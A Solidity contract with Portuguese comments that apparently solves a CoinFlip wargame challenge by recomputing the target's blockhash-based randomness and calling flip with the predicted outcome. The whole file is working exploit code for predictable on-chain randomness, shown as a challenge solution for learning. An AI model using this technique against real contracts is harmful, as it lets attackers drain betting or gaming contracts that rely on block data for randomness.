// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    // Endereço do contrato do desafio (substitua pelo seu instance address)
    ICoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        target = ICoinFlip(_targetAddress);
    }

    function predictAndFlip() public {
        // 1. Pegamos o mesmo hash que o contrato original vai usar
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // 2. Aplicamos a mesma lógica matemática
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // 3. Chamamos o flip com a resposta correta garantida
        target.flip(side);
    }
}
